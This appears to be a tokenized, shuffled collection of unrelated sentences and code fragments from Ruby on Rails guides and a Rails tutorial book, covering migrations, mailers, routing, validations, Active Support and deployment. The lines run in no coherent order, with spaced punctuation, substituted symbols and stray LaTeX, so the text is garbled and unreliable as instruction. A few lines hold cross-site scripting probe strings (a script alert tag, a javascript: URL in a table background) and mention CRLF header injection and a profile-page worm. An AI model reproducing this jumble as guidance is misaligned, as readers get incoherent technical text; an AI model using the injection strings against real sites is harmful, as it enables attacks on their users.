As seen in Listing ~ \ ref { code : mail _ account _ activation } , the \ kode { mail } method also takes a \ kode { subject } key , whose value is used as the email &apos;s subject line .

By the way , it &apos;s worth noting that \ kode { rails g } is a shortcut for \ kode { rails generate } , which is only one of several shortcuts supported by Rails ( Table ~ \ ref { table : shortcuts } ) .

SELECT * FROM clients WHERE ( clients ▖ first _ name = &apos; Andy &apos; ) LIMIT 1
If the response is a full-blown view , Rails also does some extra work to wrap the view in a layout and possibly to pull in partial views .
Usually it happens because of a fundamental misunderstanding of the way that `render` works .
This construction more closely follows the hash notation in other languages ( such as JavaScript ) and enjoys growing popularity in the Rails community .
╼ $ rake db : rollback
Finally , add a &apos; Destroy &apos; link to your `index` action template ╼ ( `app / views / articles / index ▖ html ▖ erb` ) to wrap everything together .

Of course , eventually the real user show page will look very different , and won &apos;t display the email address publicly .
Instead , the errors will propagate normally just like in other Active ╼ Record callbacks .

This code looks nicer , but the title test is still a bit long .
The extremely simple doctype \ kode { &lt; ! DOCTYPE html &gt; } is characteristic of the latest HTML standard , HTML5 .
A model may find that option useful as a way to prevent mass-assignment from setting the attribute .
To apply the changes in Listing ~ \ ref { code : seed _ users _ activated } , reset the database to reseed the data as usual :

This application is used as a mounting point for the engine , ╼ to make testing the engine extremely simple .

The heart of the signup page is a \ emph { form } for submitting the relevant signup information ( name , email , password , confirmation ) .
in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive } .
Rails can render vanilla JavaScript :
# # # `validates _ each`
Migrations provide a way to alter the structure of the database incrementally , so that our data model can adapt to changing requirements .
This command will output this information :
&quot; rubies &quot; ▖ singularize # = &gt; &quot; ruby &quot;
Verify that the new sessions form renders properly .
This is also the case for ╼ `store _ accessors` based on top of `json` or `hstore` columns .

The resulting test , shown in Listing ~ \ ref { code : password _ reset _ integration _ test } , is an excellent exercise in reading code .
Sprockets does not add any new methods to access your assets - you still use the ╼ familiar `javascript _ include _ tag` and `stylesheet _ link _ tag` :
Let &apos;s see how this works .
It is useful for idioms like this :

Keep in mind that some web browsers or proxy servers will cache this type of redirect , making the old page inaccessible .

The default is `ActionView : : Helpers : : FormBuilder` .
# # # Routing concerns
One example is the \ kode { to \ _ s } method that can convert virtually any object to a string :
The method `split` divides an array by a separator and returns the resulting chunks .
# &lt; id &gt; 4356 &lt; / id &gt;
Eager Loading Associations
You can add all the files ( apart from those that match the ignore patterns in \ kode { ▖ gitignore } ) as follows :
ubsection basic _ image _ upload ( end ) ╼ ╼ ╼ \ subsection { Image validation } % ( fold ) ╼ \ label { sec : image _ validation } ╼ ╼
&lt; script &gt; alert ( &apos; Hello &apos; ) ; &lt; / script &gt;
`ids` can be used to pluck all the IDs for the relation using the table &apos;s primary key .
To tell Git you want to keep the changes , use the \ kode { commit } command :
f &quot; ) # = &gt; true
The default \ kode { Gemfile } in the \ kode { first \ _ app } directory .
Of course , we also want to validate the presence of email addresses .
The SQL that would be executed would be something like this :
$ bin / rails generate scaffold article title : string text : text
QUERY PLAN
Set to `true` by default in `development ▖ rb` .

In this section , we &apos;ll add \ emph { ordering } and \ emph { dependency } to microposts , while also testing that the \ kode { user ▖ microposts } method actually returns an array of microposts .
After :
* Two spaces , no tabs ( for indentation ) .
For ╼ example :
The method `in _ groups` splits an array into a certain number of groups .
The result appears in Listing ~ \ ref { code : user _ profile _ test }
A single entry in the routing file , such as :
Http only cookies can be used from IE v6 .

Each nesting level will merge inherited defaults in addition to their own .
Currently , Active Record suppresses errors raised ╼ within `after _ rollback` or `after _ commit` callbacks and only prints them to ╼ the logs .
The view for the \ kode { help } action is analogous ( Listing ~ \ ref { code : raw _ help _ view } ) .
Adding the completed feed to the User model .

Now that we have a failing test , we &apos;re ready to implement friendly forwarding
# Change the path that assets are served from config ▖ assets ▖ prefix = &quot; / assets &quot;
The default is an empty string .
To avoid integration headaches later on , it &apos;s also a good idea to deploy the app to Heroku even at this early stage .
Our first step is to add Bootstrap , which in Rails applications can be accomplished with the \ texttt { bootstrap-sass } gem , as shown in Listing ~ \ ref { code : bootstrap _ sass } .
ActionView : : MissingTemplate :
Recall from Section ~ \ ref { sec : destroying _ users } that site administrators have the power to \ emph { destroy } users .
On subsequent login attempts , the forwarding URL should revert to the default ( i ▖ e ▖ , the profile page ) .
Having discussed how to store the user &apos;s remember token in a cookie for later use , we now need to learn how to retrieve the user on subsequent page views .

In fact , because this sort of construction is so useful , Active Record provides it by default :
Adding the \ kode { about } route .
It is reasonable to ask why the user needs to leave that page at all .
The migration to add the data model from Figure ~ \ ref { fig : user _ model _ account _ activation } adds all three attributes at the command line :

Here are some I particularly recommend :

However if you must do this , you may use `where` as you would normally .
render json : @ product
Because these decorators are not referenced by your Rails application itself , ╼ Rails &apos; autoloading system will not kick in and load your decorators .

The user \ kode { index } action .
In a typical Rails application this includes vendored gems .
Having generated and explored the Users resource , we turn now to the associated Microposts resource .
Whenever a bug is found , write a test to reproduce it and protect against regressions , then write the application code to fix it .

If hours are zeroed , then minutes and seconds are too ( unless they have given values ) :

* You must not run the Capistrano deployment task that precompiles assets .
For the purposes of this tutorial , I suggest creating a gemset called \ kode { railstutorial \ _ rails \ _ 4 \ _ 0 } :
Article ▖ where ( &apos; id &gt; 10 &apos; ) ▖ limit ( 20 ) ▖ order ( &apos; id desc &apos; ) ▖ only ( : order , : where )

The HTML generated for this would be :
Having written tests for signin failure , we now turn to signin success .
* ` : type` specifies an explicit MIME type .
&quot; Backoffice : : Session &quot; ▖ underscore # = &gt; &quot; backoffice / session &quot;
If you are using a database in a production environment Rails most likely has an adapter for it .
# # # Connection Preference
You can pass an object in to this local variable via the ` : object` option :
require &apos; active _ support&apos;
render layout : &quot; old &quot;
Initially , I called the new attribute \ kode { image } , but that name was so generic it ended up being confusing .
We can send email in production using SendGrid .
before _ enqueue do &#124; job &#124;
# # # Using a Proc with ` : if` and ` : unless`
Then you can use their remote branch to update your codebase .
To get the application working upon submission of a valid email address as well , we need to define a password reset mailer method .
X : : Y : : Z ▖ parents # = &gt; &#91; X : : Y , X , Object &#93;
# has _ secure _ password
Our final task is to display the number of microposts for each user , which we can do with the \ kode { count } method :
as shown in Listing ~ \ ref { code : user _ relationships _ method _ test } .
Next , we migrate as usual :
A model of followed users through user relationships .
Inside the file for the custom CSS , we can use the \ kode { @ import } function to include Bootstrap ( together with the associated Sprockets utility ) , as shown in Listing ~ \ ref { code : bootstrap _ css }

In other words , a user starts on another user &apos;s profile page , follows the other user , and is immediately redirected back to the original page .
A user with updated information .
When the application is asked to render the view for `Blorgh : : ArticlesController` &apos; s ╼ index action , it will first look for the path ╼ `app / views / blorgh / articles / index ▖ html ▖ erb` within the application .

Here &apos;s an example of a very simple validation :
user = User ▖ new do &#124; u &#124;
in the Software without restriction , including without limitation the rights
By passing the symbol \ kode { : user } to the \ kode { factory } command , we tell Factory Girl that the subsequent definition is for a User model object .
Since the Home , Help , and About page titles have a variable component , we &apos;ll use a special Rails function called \ kode { provide } to set a different title on each page .
For example , if an order belongs to a customer , but the actual name of the model containing customers is `Patron` , you &apos;d set things up this way :
else
Signup failure renders the new user page and displays error messages automatically determined by Active Record .

Follow the \ href { http : / / devcenter ▖ heroku ▖ com / articles / local-postgresql } { Heroku instructions for local PostgreSQL installation } to install the PostgreSQL database on your local system .

to use , copy , modify , merge , publish , distribute , sublicense , and / or sell
A working preview method for account activation .
The default environment for the Rails console is \ texttt { development } :
The easiest and recommended way to get a development environment ready to hack is to use the &#91; Rails development box &#93; ( https : / / github ▖ com / rails / rails-dev-box ) .
We &apos;ll get started in Chapter ~ \ ref { cha : static _ pages } by creating static pages and then add a little dynamic content .
It is explicitly set to true in `config / environments / production ▖ rb` .
Here are some things to think about :
Second , the method itself is only used internally by the User model , so there &apos;s no need to expose it to outside users .
&lt; p &gt; Customer : &lt; % = customer ▖ name % &gt; &lt; / p &gt;
The `content _ for` method allows you to insert content into a named `yield` block in your layout .
The `validates _ with` helper takes a class , or a list of classes to use for ╼ validation .
We &apos;ll learn more about foreign keys in Section ~ \ ref { sec : relationship _ user _ associations } .
NOTE : Defined in `active _ support / core _ ext / class / subclasses ▖ rb` .
( If you already started a server in your first tab , press Ctrl-C to shut it down ▖ )
The full data model appears in Figure ~ \ ref { fig : user _ model _ account _ activation } .

Client ▖ select ( &quot; viewable _ by , locked &quot; )
That &apos;s ok , we can ignore that for now .
The case of valid data is similar , but instead of verifying that the user count doesn &apos;t change , we check that clicking the button changes the count by 1 :
Mailer Testing
How detailed you want to make your tests is up to you ; a suggested template appears in Listing ~ \ ref { code : error _ messages _ test } .
We &apos;ll end with a couple of more general ways of finding users .
So how do we know if we really destroyed an object ?
No meaningful tests
create app / views / blorgh / articles
( Note the index on \ kode { user \ _ id } and \ kode { created \ _ at } ▖ )
X1 = 1
It is shown only for purposes of illustration ▖ )
# app / controllers / users _ controller ▖ rb
As with most previous examples of access control , we &apos;ll write the tests first , as shown in Listing ~ \ ref { code : following _ followers _ authorization _ test } .
use # &lt; ActiveSupport : : Cache : : Strategy : : LocalCache : : Middleware : 0x00000001c304c8 &gt;

&lt; div &gt;

Correct code for failed login .
To make a working activation email , we &apos;ll first customize the generated template as shown in Listing ~ \ ref { code : application _ mailer } .
To pass the object to the partial , we use a hash with value equal to the object and key equal to the desired name of the variable in the partial , which is what this code accomplishes :
Now that we &apos;ve filled in several of the layout links , it &apos;s a good idea to test them to make sure they &apos;re working correctly .
If you do this , you put your entire database at risk because once a user finds out they can exploit your database they can do just about anything to it .
You can associate the ` : if` and ` : unless` options with a symbol corresponding ╼ to the name of a method that will get called right before validation happens .
These are common validation options :
1235551234 ▖ to _ s ( : phone , area _ code : true )
As a general rule , if a method doesn &apos;t need an instance of an object , it should be a class method .
At this point the User model specs should be passing :
You can also override conditions using the `only` method .
# the default ( validates on both create and update )
Correct code for failed signin .
* You may be deploying to more than one server , and want to avoid ╼ duplication of work .

* `from`
will return \ kode { true } inside an integration test and false otherwise .
The test suite should now be \ passing :
Let &apos;s see what the full ╼ thing looks like :
In the case of our User model , each user potentially has many microposts .
In fact , the two are exactly equivalent ; \ kode { attr \ _ accessor } is merely a convenient way to create just such getter / setter methods automatically .

This is useful anyway , but just in case you don &apos;t have it set ╼ up , make sure that you do this first :

You should use this option only when the string ╼ represents a really short condition .
There are cases where the user time zone might be in the future compared to the system time zone , which `Time ▖ now` uses by default .

In order to validate associated records whose presence is required , you must ╼ specify the ` : inverse _ of` option for the association :
NoMethodError : You have a nil object when you didn &apos;t expect it !
While these are sufficient for most use cases , there are circumstances when you want more environments .
Change the content of the \ kode { hello } action in Listing ~ \ ref { code : hello _ action } to read ``hola , mundo ! &apos; &apos; instead of ``hello , world ! &apos; &apos; .
You can ask that `nil` is returned instead with the ` : allow _ nil` option :
You might find ╼ someone who &apos;s also interested in building that feature .

REST is an architectural style for developing distributed , networked systems and software applications such as the World Wide Web and web applications .
At this early stage , writing tests might thus seem hopelessly intimidating .
Before we dig into more details , let &apos;s talk about how validations fit into the ╼ big picture of your application .

Rails 4 creates both `app / assets / javascripts / application ▖ js` and ╼ `app / assets / stylesheets / application ▖ css` regardless of whether the ╼ --skip-sprockets option is used when creating a new rails application .
There is a default error ╼ message for each one of the validation helpers .
The params hash has a nested person value , which can therefore be accessed with params &#91; : person &#93; in the controller .
As you &apos;ve already seen , the ` : message` option lets you specify the message that ╼ will be added to the `errors` collection when validation fails .
Most of the adapters support multiple queues .

In our case , we want it to show up when we ╼ navigate to the root URL of our site , &lt; http : / / localhost : 3000 &gt; .
The `object` and `as` options can also be used together :
INFO : As a rule of thumb you can think of `underscore` as the inverse of `camelize` , though there are cases where that does not hold .
We can now check our database just to be double-sure that the new user was actually created :
For example , on my system either of the following works ( depending on whether I &apos;m using the cloud IDE or the local server ) :
Allowing empty passwords on update .
# # # Configuring i18n
* How to install Rails , create a new Rails application , and connect your ╼ application to a database .
No layout .

This introduces the Sass \ emph { mixin } facility , in this case called \ kode { box \ _ sizing } .
The generation of the reader instance method can be prevented by setting the option ` : instance _ reader` to `false` .
This noisier construction makes debugging easier by avoiding silent errors .
# No change needed ; PATCH will be preferred , and PUT will still work .
* Environment-specific configuration files
To fix this , we just need to add the user id presence validation shown in Listing ~ \ ref { code : micropost _ user _ id _ validation } .
config ▖ assets ▖ digest = false
&lt; div &gt; &lt; % = submit _ tag &apos; Save &apos; % &gt; &lt; / div &gt;
$ cd ~ / workspace /

Before we move on , though , there are two tasks to complete .
When the user clicks the link , find the user by email address , and then authenticate the token by comparing with the activation digest .
Having shown how to create , show , and edit users , we come finally to destroying them ( Figure ~ \ ref { fig : demo _ destroy _ user } ) .
in Listing ~ \ ref { code : rails _ routes _ root _ route } .

Rails also comes with built-in help that you can generate using the rake ╼ command-line utility :

To render a partial as part of a view , you use the `render` method within the view :
A singular resourceful route generates these helpers :
At this point , we can reseed the development database as usual :
For example , suppose we create an array , assign a second variable to it , and then reverse the first array in place using the \ kode { reverse ! }
# # # # text _ area _ tag

$ bundle exec rake test TEST = test / integration / users _ login _ test ▖ rb ╼ $ bundle exec rake test
We can now reproduce the previous behavior of \ kode { authenticated ? } \ by invoking it like this :
What happens if a module is anonymous ?
# = &gt; &#91; 1 , 2 , 3 &#93;
&lt; div class = &quot; field &quot; &gt;
A `has _ one` association also sets up a one-to-one connection with another model , but with somewhat different semantics ( and consequences ) .

The `content _ for` method is very helpful when your layout contains distinct regions such as sidebars and footers that should get their own blocks of content inserted .
As indicated in Listing ~ \ ref { code : cat _ public _ key } , users of the cloud IDE can view their public key using the \ kode { cat } command , which can then be selected and copied .

We won &apos;t be needing CoffeeScript in this tutorial , but it &apos;s an elegant little language that compiles to JavaScript .
Since we &apos;re about to add the ability to create new users through the web , let &apos;s remove the user created at the console in Section ~ \ ref { sec : creating _ and _ authenticating _ a _ user } .
# Compress JavaScripts and CSS
Finally , we &apos;ll add authorization methods to our actions to enforce a site security model .
In this section , we &apos;ll combine Bootstrap with some custom CSS rules to start adding some style to the sample application .
Tests for a Contact page .
In the Blog application , you will now create a new _ resource _ .
We can verify that Listing ~ \ ref { code : micropost _ dependency } is working with a test for the User model .
You can specify a full path relative to the document root , or a URL .
Having users sign in will also allow us to implement a security model , restricting access to particular pages based on the identity of the signed-in user .
The result of adding these additional checks appears in Listing ~ \ ref { code : _ format _ jquery _ file _ test } .
Indeed , in Section ~ \ ref { sec : creating _ microposts } we &apos;ll use a text \ emph { area } instead of a text field for submitting microposts .
# # # # email _ field _ tag
&lt; / optgroup &gt;
The result of this operation is an array of three strings .
After creating the topic branch , we &apos;ll edit it to make it a little more descriptive .
There &apos;s a complementary \ kode { unless } keyword that works the same way :

First navigate to the root directory of the first app and initialize a new repository :

Web browsers are ╼ limited in the number of requests that they can make in parallel , so fewer ╼ requests can mean faster loading for your application .
You can call `destroy` on Active Record objects when you want to delete ╼ them from the database .
Given a string with a qualified constant name , `demodulize` returns the very constant name , that is , the rightmost part of it :

After request is complete , flushes all the logs .
Since jQuery is the default ╼ JavaScript library from Rails 3 ▖ 1 onwards , you don &apos;t need to copy `jquery ▖ js` ╼ into `app / assets` and it will be included automatically .
The methods `beginning _ of _ week` and `end _ of _ week` return the dates for the ╼ beginning and end of the week , respectively .
Once these CSS rules have been applied , the signup page appears as in Figure ~ \ ref { fig : signup _ form } .

To do that , ╼ bind to the `ajax : success` event .
To avoid this problem , we &apos;ll use a \ emph { signed } cookie , which securely encrypts the cookie before placing it on the browser :

When a filename is unique and based on its content , HTTP headers can be set to ╼ encourage caches everywhere ( whether at CDNs , at ISPs , in networking equipment , ╼ or in web browsers ) to keep their own copy of the content .
The method is to require each user to have a password ( with a password confirmation ) , and then store a \ emph { hashed } version of the password in the database .
array = &#91; 1 , &#91; 2 , 3 &#93; &#93;
The page looks fine , though , so what &apos;s the problem ?
The `helpers` , `mailers` and `models` directories are ╼ empty , so they aren &apos;t described in this section .
The \ kode { update \ _ attributes } method accepts a hash of attributes , and on success performs both the update and the save in one step ( returning \ kode { true } to indicate that the save went through ) .

The code is exactly analogous to Listing ~ \ ref { code : account _ activation _ preview } , as shown in Listing ~ \ ref { code : password _ reset _ preview } .
Recall from Section ~ \ ref { sec : objects _ and _ message _ passing } that \ kode { ! ! } \ converts an object to its corresponding boolean value .
To accomplish this , we will need some fairly advanced Rails , Ruby , and even SQL programming techniques .
JavaScript enforces the same origin policy , that means a script from one domain cannot access cookies of another domain .

But wait---actions don &apos;t have return values , at least not ones that matter .
You can also define other defaults in a route by supplying a hash for the ` : defaults` option .
The vi editor is one of the most ancient yet powerful weapons in the Unix arsenal , and Vim is ``vi improved &apos; &apos; .

We &apos;re now in a position to start implementing our signin model , namely , remembering user signin status ``forever &apos; &apos; and ending the session only when the user explicitly signs out .
At this point , our deletion code is well-tested , and the test suite should be \ passing :
As a result , evaluation falls off the end of the \ kode { current \ _ user } method , thereby returning \ kode { nil } as required .
But there are two perhaps more idiomatically correct ways to define class methods , one slightly confusing and one extremely confusing .
A partial to render a single user .
scope : published , - &gt; { where ( published : true ) }
Adding the CSS for the site footer .
And you can tell the method not to fill the smaller groups passing `false` :
def comment _ params
in Listing ~ \ ref { code : initial _ signup _ test } .
Happily , the form variable ~ \ kode { f } can access the associated object through \ kode { f ▖ object } , so that in

It uses the ╼ `blank ? ` method to check if the value is either `nil` or a blank string , that ╼ is , a string that is either empty or consists of whitespace .
* ` : delete _ all` causes all the associated objects to be deleted directly from the database ( so callbacks will not execute )

We saw a similar idea in Section ~ \ ref { sec : uniqueness _ validation } , where we needed to convert an email address to lower-case before saving a user to the database .
This provides additional flexibility and makes it explicit that you &apos;re only generating HTTP headers .
To set this configuration setting within the application , an initializer should ╼ be used .

As a workaround , specify the URL for the form directly , like so :
`camelize` accepts an optional argument , it can be ` : upper` ( default ) , or ` : lower` .

in Listing ~ \ ref { code : micropost _ order _ test } and
We &apos;ll add a `data- * ` ╼ attribute to our link , and then bind a handler to the click event of every link ╼ that has that attribute :
Validating the presence of an \ kode { email } attribute .
At this point , if you are using Git you should merge the changes back into the master branch :

For example , say you want to send a newsletter whose language depends on the user .

Rails follows a simple set of coding style conventions :

You can achieve this using the ` : body` ╼ option .
Defining the new token and digest methods using \ kode { self } .
We can also go the other way with the \ kode { join } method :
This flash persistence is a bug in our application , and before proceeding with a fix it is a good idea to write a test catching the error .
Due to a change in the internals ╼ of `ActiveSupport : : Callbacks` , this is no longer allowed in Rails 4 ▖ 1 .
Customizing Resourceful Routes
This can be changed by setting ╼ `config ▖ assets ▖ cache _ store` :
With these scopes , you can use every method previously covered such as `where` , `joins` and `includes` .

( The other three links have no options hash , which is fine since it &apos;s optional ▖ )
As a safety net , we &apos;ll first write a test to make sure the initial model object is valid .
The migration itself consists of a \ kode { change } method that determines the \ linebreak change to be made to the database .

This practice is rather cumbersome , and in this section we discuss two ways to eliminate its necessity .

So , in this case , the router would no longer match ` / photos / 1` to this route .

In this case , `params` would be ` { controller : &apos; photos &apos; , action : &apos; show &apos; , id : &apos; 1&apos; , user _ id : &apos; 2&apos; } ` .
Applying these changes gives much more compact tests for the Home page :

Rails adds other helpers , too :
We can accomplish this in Rails with the \ kode { form \ _ for } helper method , which takes in an Active Record object and constructs a form using the object &apos;s attributes .

For a small example like this , there &apos;s not much savings , but if there are lots of things to escape it can be a real help :
To make the password digest , \ kode { has \ _ secure \ _ password } uses a state-of-the-art hash function called \ href { http : / / en ▖ wikipedia ▖ org / wiki / Bcrypt } { bcrypt } .

As usual , if you &apos;re using Git for version control , now would be a good time to make a new branch :

There may be times when you wish to customize the query used by `belongs _ to` .
As in previous chapters , we will find it convenient to use the seed data Rake task to fill the database with sample relationships .

The application signs users out by deleting the session &apos;s user id and removing the permanent cookie from the browser .
You can use the `errors ▖ full _ messages` or `errors ▖ to _ a` methods to view the messages in the form they might be displayed to a user .

The way to do this is to use \ kode { attr \ _ accessor } to create an accessible attribute , which we saw before in Section ~ \ ref { sec : a _ user _ class } :
Analogously to `DateTime` , the predicates `past ? ` , and `future ? ` are relative to `Time ▖ current` .

Notice that only _ one _ migration was copied over here .
The new record might not be saved to the database ; that depends on whether validations passed or not ( just like `create` ) .
This code contains an SQL subselect , and internally the entire select for user ~ 1 would look something like this :

validates : email , confirmation : true
&lt; table background = &quot; javascript : alert ( &apos; Hello &apos; ) &quot; &gt;
Trying them both reveals that the latter works .
NOTE : Make sure your queueing backend &quot; listens &quot; on your queue name .

Inside the \ kode { header } tag , we see a couple of \ kode { div } tags :

This works well for simple changes .
In HTTP , the header block is followed by two CRLFs and the actual data ( usually HTML ) .
It does not save the associated object either .

Sass mixins allow a group of CSS rules to be bundled and reused in multiple places .
My favorite Rails deployment option is Heroku , which is a hosted platform built specifically for deploying Rails and other web applications
For example , you might have a view that looked like this :
This method takes exactly the same options as `render` , but it returns a string instead of sending a response back to the browser .
This behavior can be turned off by setting `ActiveRecord : : Base ▖ lock _ optimistically = false` .
Putting this into the login form gives the code shown in Listing ~ \ ref { code : remember _ me _ checkbox } .
The result should look something like Figure ~ \ ref { fig : demo _ micropost _ index } .

* Summary of a change that briefly describes what was changed .
The first edition of this book used the \ kode { user ▖ following } terminology , which even I found confusing at times .
The reason ╼ for this is so that the migrations for the engine are run after any existing ╼ migrations in the application .
By default , \ kode { split } divides a string into an array by splitting on whitespace , but you can split on nearly anything else as well :
The method `end _ of _ hour` returns a timestamp at the end of the hour ( hh : 59 : 59 ) :
A resource is the ╼ term used for a collection of similar objects , such as articles , people or ╼ animals .
* `create`
The controller passes the HTML back to the browser
create app / views / layouts / mailer ▖ html ▖ erb
For now , we won &apos;t need any gems other than the defaults .
This code uses the \ kode { add \ _ column } method to add a \ kode { password \ _ digest } column to the \ kode { users } table .
If you inspect the HTML that is ╼ generated , by viewing the source of the page , you will see that the `action` ╼ attribute for the form is pointing at ` / articles / new` .
You can also use a string that will be evaluated using `eval` and needs to ╼ contain valid Ruby code .
render action : &quot; special _ show &quot;
The result is the Relationship data model shown in Figure ~ \ ref { fig : relationship _ model } .
Options include one of the symbols ` : memory _ store` , ` : file _ store` , ` : mem _ cache _ store` , ` : null _ store` , or an object that implements the cache API .
* `before _ remove`
# Create an error message and re-render the signin form .
Because this engine is ╼ going to be namespaced , its assets should be too .
from Listing ~ \ ref { code : micropost _ validity _ test } with this :
The ` : on` option lets you specify when the validation should happen .
* `order`
If a block is given , `sum` becomes an iterator that yields the elements of the collection and sums the returned values :
belongs _ to : customer , dependent : : destroy ,
╼ &gt; &gt; x + = 1
# # # A Simple Example
# # # # # `beginning _ of _ quarter` , `end _ of _ quarter`
&lt; % = render &quot; shared / footer &quot; % &gt;
In this case , though , we &apos;ve set the \ kode { alt } text explicitly in order to capitalize ``Rails &apos; &apos; .
Blorgh : : Engine ▖ routes ▖ draw do
Returns `check _ box` tags for the collection of existing return values of `method` for `object` &apos; s class .

On the other hand , regular comments do not use an arrow :

* They do not work with ` : through` associations .
Consider the following code , which finds 10 clients and prints their postcodes :
# # # Grouping
For example , when searching for a file called ``Gemfile &apos; &apos; , six possibilities will show up , because each project has matching files called \ kode { Gemfile } and \ kode { Gemfile ▖ lock } .

The reasoning behind this is to allow the team to change these methods according to their internal needs across releases as they see fit .

( Note that , if you want your annotations to be up-to-date , you &apos;ll have to run \ kode { annotate } again any time the data model changes ▖ )
( We will implement just such an attribute in Section ~ \ ref { sec : administrative _ users } ▖ )
Ajax isn &apos;t just client-side , you also need to do some work on the server ╼ side to support it .
For example , you can use a ` : before _ save` callback to cause something to happen just before an object is saved .
This latter strategy involves creating the necessary test files ( called \ emph { specs } ) and filling them with the test code \ emph { exactly } as it appears in the book .
as seen in Listing ~ \ ref { code : log _ in _ password _ reset } and Figure ~ \ ref { fig : forgot _ password _ link } .

The default is ` : cookie _ store` ; other valid options include ` : active _ record _ store` , ` : mem _ cache _ store` or the name of your own custom class .

We can just trust the \ kode { t } ~ object to do its job .
While Rails uses intelligent defaults that will work well in most situations , there may be times when you want to customize the behavior of the `belongs _ to` association reference .
To better understand this we must see some examples .
Add this file with the following contents , if you wish to wrap parameters into a nested hash .

The `first ! ` method behaves exactly like `first` , except that it will raise `ActiveRecord : : RecordNotFound` if no matching record is found .
Of course , eventually the real user show page will look very different ( and won &apos;t display the email address publicly ) .
\ href { http : / / sivers ▖ org / } { Derek Sivers } ( \ href { http : / / sivers ▖ org / } { sivers ▖ org } )

In our case , the analogous code would look like this :

Because ╼ the form &apos;s remote option is set to true , the request will be posted to the ╼ `UsersController` as an Ajax request , looking for JavaScript .
&lt; h1 &gt; New article &lt; / h1 &gt;
The simpler way is to use `has _ and _ belongs _ to _ many` , which allows you to make the association directly :
= &gt; &#91; 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 , 18 , 19 , 20 , 21 , 22 , 23 ,
But first , a quick introduction to the situations where each association type is appropriate .
It means you can reach the module object via the constant .
This will call `javascript _ path` internally and merge with your current host or your asset host .
This leaves the test for the Home page as the last one to fail .
With all the preparation finished , we &apos;re finally ready to get started developing the sample application .
Note that &quot; % 0d % 0a &quot; is URL-encoded for &quot; \ r \ n &quot; which is a carriage-return and line-feed ( CRLF ) in Ruby .

Tests act as a \ emph { client } for the application code , thereby helping determine its design and its interface with other parts of the system .
Place the token in the browser cookies with an expiration date far in the future .
To test the micropost display on the profile , we need to associate the fixture microposts with a user .
In the end , he got a 4 KB worm , which he injected into his profile page .
For example , we could implement user signin by placing a cookie with value equal to the remember token that expires 20 ~ years from now :
What follows builds on the work from Section ~ \ ref { sec : microposts _ resource } ; as with the model in that section , our new Micropost model will include data validations and an association with the User model .

With this template in place , we can generalize the method by adding a function argument with the name of the digest , and then use string interpolation as above :

In addition to the model , Rails has also made a migration to create the ╼ corresponding database table :

If you now go to &lt; http : / / localhost : 3000 / articles / new &gt; you &apos;ll * almost * be able ╼ to create an article .
What the `create` action should ╼ be doing is saving our new article to the database .
validates : token , presence : true , uniqueness : true , strict : TokenGenerationException
In case of collision the key in the hash of the argument wins in `merge` .
This code is responsible for inserting the contents of each page into the layout .
The result appears in Listing ~ \ ref { code : microposts _ destroy _ action }
In this mode all ╼ requests for assets in the pipeline are handled by Sprockets directly .
In addition , the destroyed object still exists in memory :
If you refresh &lt; http : / / localhost : 3000 / articles / new &gt; now , you &apos;ll get a new error :
Custom session stores can also be specified :
To get started with the Ruby installation , first \ href { http : / / rvm ▖ io / rvm / install / } { install RVM } :

Of course , it &apos;s never a bad idea to take a look at the page in a browser to make sure our tests aren &apos;t completely crazy ( Figure ~ \ ref { fig : about _ us } ) .
The incorrect flash behavior is a minor bug in our application .
In previous versions of Rails , using
Because security is a top priority , err on the side of writing tests of the security model first .

create app / assets / stylesheets / scaffolds ▖ css ▖ scss
The time has finally come to add a second such resource : user \ emph { microposts } , which are short messages associated with a particular user
* If `value` is a callable object it must expect one or two arguments .
Next , we need to include CarrierWave &apos;s \ href { https : / / github ▖ com / minimagick / minimagick } { MiniMagick } interface for ImageMagick , together with a resizing command .
In the case of users and microposts , this process is straightforward , since they are naturally resources in their own right .
When in doubt , it is best to consult a Rails team member before backporting your changes to avoid wasted effort .
To do this , you &apos;ll need to generate a comment ╼ model , a comment controller and then modify the articles scaffold to display ╼ comments and allow people to create new ones .
If you want to define the singular form of a resource , you should add additional rules to the `Inflector` :
Whether you included the configuration in Listing ~ \ ref { code : irbrc } , you can start the console at the command line as follows :
Client ▖ unscoped ▖ load

A test for presence of the \ kode { email } attribute .
▖ gitignore
M ▖ parents # = &gt; &#91; X : : Y , X , Object &#93;
The ╼ second time we run this code , the block will be ignored .
&lt; % = asset _ path ( &apos; smile ▖ png &apos; ) % &gt;
password _ field _ tag &apos; pass&apos;
On Linux , the default terminal is fine .
Here \ kode { user ▖ authenticate } returns \ kode { false } for invalid password .
in Listing ~ \ ref { code : annotated _ title _ helper } .
&quot; User &quot; ▖ foreign _ key ( false ) # = &gt; &quot; userid &quot;

( It &apos;s probably a good idea to write a test for the flash as well , which is left as an exercise ( Section ~ \ ref { sec : exercises _ the _ flash } ) ▖ )
The News views will use the new layout , hiding the top menu and adding a new right menu inside the &quot; content &quot; div .

We &apos;re now ready to cover the &quot; D &quot; part of CRUD , deleting articles from the ╼ database .
This allows `except` to play nice with hashes with indifferent access for instance :
To add the new webserver , we simply follow the \ href { https : / / devcenter ▖ heroku ▖ com / articles / rails-Puma } { Heroku Puma documentation } .
If you &apos;re using the cloud IDE or another Unix-like system , you can accomplish this with the \ kode { curl } utility as follows
Rails determines the name of the partial to use by looking at the model name in the collection , `Product` in this case .

Durations can be added to and subtracted from datetimes :

The question mark syntax is fine , but when we want the \ emph { same } variable inserted in more than one place , the second syntax is more convenient .
&#124; Middleware &#124; Purpose &#124;
Most of the secure password machinery will be implemented using a single Rails method called \ kode { has \ _ secure \ _ password } , which we &apos;ll include in the User model as follows :
The Home page with a working status feed .
If the receiver responds to `convert _ key` , the method is called on each of the arguments .
create app / views / microposts
# # # Ruby Versions

Action Mailer now just inherits from `AbstractController` , so you have access to ╼ the same generic helpers as you do in Action Controller .

At the end , we &apos;ll re-run the tests from Section ~ \ ref { sec : adding _ page _ titles } to verify that the titles are still correct .
This doesn &apos;t apply to just Decorators , but anything that you add in an engine ╼ that isn &apos;t referenced by your main application .
This is very similar to the `Article` model that you saw earlier .

Another common model is to expire the session after a certain amount of time .

You can do this by running this ╼ command :

Here \ kode { User ▖ count } is \ kode { 0 } because we reset the database at the beginning of this section .

Here \ kode { remember \ _ digest } is an attribute on the User model , and inside the model we can rewrite it as follows :
An example with a predicate :
Moreover , Rails conventionally uses \ emph { named routes } , which involves code like
The user index with pagination .

To actually create the table , you &apos;d run `rake db : migrate` ╼ and to roll it back , `rake db : rollback` .
Open `app / views / welcome / index ▖ html ▖ erb` and modify it as follows :
